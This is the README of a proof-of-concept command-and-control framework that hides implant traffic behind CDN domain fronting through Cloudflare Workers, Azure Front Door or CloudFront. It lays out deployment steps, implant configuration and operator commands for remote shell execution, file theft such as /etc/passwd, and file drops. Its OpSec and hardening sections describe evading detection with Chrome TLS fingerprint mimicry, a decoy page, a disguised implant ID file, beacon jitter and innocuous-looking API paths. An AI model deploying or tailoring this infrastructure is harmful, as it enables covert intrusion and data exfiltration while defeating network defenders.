# C2 CDN Domain Fronting

A **proof-of-concept** Command & Control implementation that uses **CDN Domain Fronting** to hide C2 infrastructure behind a legitimate CDN (Cloudflare, Azure Front Door, AWS CloudFront).

## How It Works

```
                    TLS handshake                         Forwarded request
 Implant  ──────── HTTPS ──────►  CDN Edge  ──────────────►  C2 Server
    │          SNI: www.google.com    │    Host: c2-api.hidden.domain
    │          Host: c2-api.hidden    │
    └───────────── DECOY ────────────┘
                  (Google landing page for non-C2 requests)
```

1. The **implant** resolves the CDN's IP and opens a TLS connection using **uTLS** with a Chrome JA3 fingerprint.
2. The TLS **SNI** (Server Name Indication) is set to a legitimate front domain (e.g., `www.google.com`) — so the TLS handshake looks perfectly normal.
3. The HTTP **Host header** is set to your hidden C2 domain (e.g., `c2-api.hidden.domain`).
4. A **Cloudflare Worker** inspects the Host header; if it matches the hidden C2 domain, it forwards the request to your backend C2 server. Otherwise, it serves a decoy page.
5. The **C2 server** processes the beacon, dequeues pending commands, and returns them.

This makes the C2 traffic indistinguishable from normal CDN traffic at the network level.

## Architecture

```
c2-cdn-fronting/
├── cmd/
│   ├── server/            C2 backend server (operator console + HTTP API)
│   │   └── main.go
│   └── client/            Implant (beacon loop + uTLS domain fronting)
│       └── main.go
├── worker.js              Cloudflare Worker (routing + decoy)
├── go.mod / go.sum        Go module dependencies
└── README.md              This file
```

---

## Quick Start

### Prerequisites

- Go 1.21+
- A Cloudflare account (free tier works)
- A domain on Cloudflare (or use Azure Front Door / AWS CloudFront)
- A server/VM to run the C2 backend (any public IP)

### 1. Build

```bash
cd c2-cdn-fronting

# Build server
go build -o c2-server ./cmd/server/

# Build client (implant)
go build -o c2-client ./cmd/client/
```

### 2. Start the C2 Server

```bash
# Default port 8080
./c2-server

# Custom port
C2_PORT=9090 ./c2-server
```

You'll see the operator console:

```
[*] C2 CDN Fronting Server
[*] C2 server listening on :8080
[*] Type 'help' for commands
>
```

### 3. Deploy the Cloudflare Worker

#### Option A: Dashboard (no CLI needed)

1. Log in to the [Cloudflare Dashboard](https://dash.cloudflare.com/)
2. Go to **Workers & Pages** → **Create Application** → **Create Worker**
3. Give it a name (e.g., `c2-fronting-worker`)
4. Paste the contents of `worker.js` into the editor
5. Go to **Settings** → **Variables** and add:

   | Variable | Value |
   |----------|-------|
   | `C2_HOST` | `c2-api.yourdomain.com` (your hidden C2 domain) |
   | `BACKEND_URL` | `http://198.51.100.1:8080` (your C2 server IP:port) |

6. **Save and Deploy**
7. Note the worker URL: `https://c2-fronting-worker.your-subdomain.workers.dev`

#### Option B: Wrangler CLI

```bash
# Install wrangler
npm install -g wrangler

# Create wrangler.toml
cat > wrangler.toml << 'EOF'
name = "c2-fronting-worker"
main = "worker.js"

[vars]
C2_HOST = "c2-api.yourdomain.com"
BACKEND_URL = "http://198.51.100.1:8080"
EOF

# Deploy
wrangler deploy
```

### 4. Configure CDN Domain Fronting

You need a CDN that fronts for your worker. Here are the three main options:

#### Cloudflare (Recommended)

1. Add your hidden C2 domain (e.g., `c2-api.yourdomain.com`) to Cloudflare
2. Create a **DNS A record** pointing to any public IP (it won't be used directly — the worker handles routing):
   ```
   c2-api.yourdomain.com  A  192.0.2.1  (proxied: orange cloud ON)
   ```
3. Create a **Cloudflare Worker Route** that triggers on `c2-api.yourdomain.com/*`
4. For the **front domain**, you can use:
   - Any other domain on Cloudflare (e.g., `www.your-normal-site.com`)
   - Cloudflare's own `workers.dev` subdomain
   - A third-party domain hosted on Cloudflare

> **Key insight**: The front domain just needs to be on the same CDN edge network. Cloudflare routes based on SNI to the edge, then the Worker inspects the Host header. If you use `www.google.com` as your front domain, it only needs to be resolvable to Cloudflare IPs — but Google doesn't use Cloudflare, so pick a domain YOU control that's on Cloudflare.

#### Azure Front Door

1. Create an Azure Front Door profile
2. Add your worker's URL as a backend origin
3. Configure the frontend host as your hidden C2 domain
4. Use any of Azure's frontend hosts for the front domain (standard AFD domain)

#### AWS CloudFront

1. Create a CloudFront distribution
2. Set the origin to your worker URL
3. Configure alternate domain names (CNAMEs) for your hidden domain
4. For the front domain, use the CloudFront distribution domain name (e.g., `d123.cloudfront.net`)

### 5. Run the Implant

```bash
# Basic usage
./c2-client \
  -cdn-url "https://c2-fronting-worker.your-subdomain.workers.dev" \
  -front-domain "www.your-front-domain.com" \
  -c2-host-header "c2-api.yourdomain.com" \
  -interval 30 \
  -verbose

# With config file (stealthier)
cat > implant-config.json << 'EOF'
{
  "cdn_url": "https://c2-fronting-worker.your-subdomain.workers.dev",
  "front_domain": "www.your-front-domain.com",
  "c2_host_header": "c2-api.yourdomain.com",
  "beacon_interval": 60,
  "id_file": "/tmp/.systemd-cache-id"
}
EOF

./c2-client -config implant-config.json -verbose
```

---

## Server Console Commands

| Command | Description |
|---------|-------------|
| `list` | Show all connected clients |
| `task <client> <type> <args>` | Issue a command to a client |
| `help` | Show usage |
| `exit` | Shutdown server |

### Command Types

| Type | Args | Description |
|------|------|-------------|
| `exec` | `<shell command>` | Execute a shell command on the implant |
| `upload` | `<path>` | Upload a file from the implant to the C2 server (base64 encoded in result) |
| `download` | `<path> <base64>` | Download a file to the implant (server embeds base64 content in command) |
| `config` | `<key>=<value>` | Change implant configuration at runtime |

### Examples

```
> list

CLIENT ID     HOSTNAME             USER         PLATFORM     LAST SEEN
a1b2c3d4e5f6 webserver-01          root         linux/amd64  12s ago

> task a1b2c3d4e5f6 exec whoami

[+] Command cmd_1 queued for a1b2c3d4e5f6

[>] Result from a1b2c3d4e5f6 / cmd_1 (completed):
root

> task a1b2c3d4e5f6 upload /etc/passwd

[+] Command cmd_2 queued for a1b2c3d4e5f6

> task a1b2c3d4e5f6 config beacon_interval=60

[+] Command cmd_3 queued for a1b2c3d4e5f6
```

---

## Implant Flags & Options

```
-cdn-url <url>           CDN URL to connect to (e.g. https://worker.example.workers.dev)
-front-domain <domain>   TLS SNI front domain (e.g. www.your-front-domain.com)
-c2-host-header <domain> Hidden C2 domain for Host header (e.g. c2-api.yourdomain.com)
-interval <seconds>      Beacon interval in seconds (default: 30)
-id-file <path>          Path to store persistent client ID (default: .c2-client-id)
-config <path>           Load config from JSON file
-verbose                 Enable verbose output (TLS details, errors)
```

### Config File Format

```json
{
  "cdn_url": "https://c2-fronting-worker.your-subdomain.workers.dev",
  "front_domain": "www.your-front-domain.com",
  "c2_host_header": "c2-api.yourdomain.com",
  "beacon_interval": 60,
  "id_file": "/tmp/.systemd-cache-id"
}
```

Config file values override individual flags. This allows stealthier deployment (no command-line arguments visible in `ps`).

---

## Worker Script Details

The `worker.js` Cloudflare Worker handles two scenarios:

### C2 Routing
When the `Host` header matches the `C2_HOST` environment variable, the worker:
1. Reconstructs the URL with the backend server address
2. Forwards the request with all original headers and body
3. Returns the backend response to the implant

### Decoy
When the `Host` header does NOT match (e.g., when a censor/probe connects directly to the worker URL):
1. Serves a Google.com look-alike decoy page
2. The page is cached at the edge (5 minutes)
3. No evidence of C2 activity is visible

This makes the worker look like a simple landing page to anyone probing it directly, while only requests with the correct Host header reach the actual C2 backend.

---

## OpSec Notes

### TLS Fingerprinting

This project uses **uTLS** (`github.com/refraction-networking/utls`) to mimic the Chrome browser's JA3/TLS fingerprint. The Go standard library's `crypto/tls` has a unique fingerprint that is trivially detected by modern TLS fingerprinting tools. uTLS eliminates this detection vector by:

- Emulating Chrome's cipher suite ordering
- Matching Chrome's TLS extension ordering
- Using the same elliptic curves as Chrome
- Replicating Chrome's signature algorithms

### Domain Fronting Availability

Domain fronting is increasingly restricted. As of 2026:

| CDN | Status |
|-----|--------|
| **Cloudflare Workers** | ✅ Works (workers.dev subdomain + custom host header) |
| **Azure Front Door** | ⚠️ May work (varies by region) |
| **AWS CloudFront** | ⚠️ Generally blocked (SNI-based routing) |
| **Fastly** | ❌ Blocked |

**Cloudflare is the most reliable option.** For maximum reliability, use a custom domain on Cloudflare as both the front domain and the C2 domain.

### Detection Risks

- **JA3 fingerprinting**: Mitigated by uTLS with Chrome fingerprint
- **DNS queries**: The implant connects to the CDN IP directly, not the C2 domain. DNS for the C2 domain only happens on the CDN side.
- **TLS certificate**: The certificate presented belongs to the CDN/front domain, which is completely legitimate
- **Traffic patterns**: Regular beacon intervals can be detected through timing analysis — vary the interval and add jitter in production
- **Content inspection**: Encrypted traffic can't be inspected, but HTTP request patterns can be fingerprinted. The `/api/v1/beacon` and `/api/v1/result` paths are obvious — rename them for production use

### Production Hardening

1. **Obfuscate API paths**: Change `/api/v1/beacon` to something innocuous like `/analytics/collect`
2. **Add jitter**: Add random jitter to the beacon interval (±30%)
3. **Encrypt payloads**: Add a layer of payload encryption (AES-GCM or similar)
4. **Minimize output**: Don't log all output to the operator console in production
5. **Client authentication**: Add a shared secret or certificate pinning
6. **Domain rotation**: Have multiple front domains and rotate them
7. **Custom worker paths**: Add multiple worker routes with different behaviors

---

## Testing Locally

You can test the C2 server and client locally without a CDN:

```bash
# Terminal 1: Start server on localhost
C2_PORT=8080 go run ./cmd/server/

# Terminal 2: Run client against local (no uTLS, direct connection)  
CDN_URL="http://localhost:8080" \
FRONT_DOMAIN="localhost" \
C2_HOST_HEADER="localhost" \
go run ./cmd/client/ -cdn-url "http://localhost:8080" -front-domain "localhost" -c2-host-header "localhost" -verbose
```

> **Note**: When testing locally with plain HTTP, the uTLS code path is still used for HTTPS. For local test, the `-cdn-url` must point to your local server over HTTP (not HTTPS) — but the uTLS dialer will fail on HTTP. In production, the CDN URL is always HTTPS.

---

## License

Proof-of-concept for educational and authorized security testing only. Use responsibly.
